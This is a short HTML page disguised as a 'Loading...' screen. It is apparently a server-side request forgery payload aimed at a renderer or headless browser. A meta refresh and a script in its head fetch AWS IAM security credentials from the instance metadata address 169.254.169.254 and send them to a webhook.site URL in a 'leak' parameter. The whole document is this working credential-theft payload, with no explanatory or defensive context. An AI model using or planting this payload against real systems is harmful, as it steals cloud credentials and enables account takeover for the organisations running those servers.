<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" />
    <script>
        // Fetch AWS metadata and send it to Webhook
        fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        .then(response => response.text())
        .then(data => {
            fetch("https://webhook.site/384ecd47-593d-488d-ba66-b92a61cb4cd6?leak=" + encodeURIComponent(data));
        })
        .catch(error => console.log("Error:", error));
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
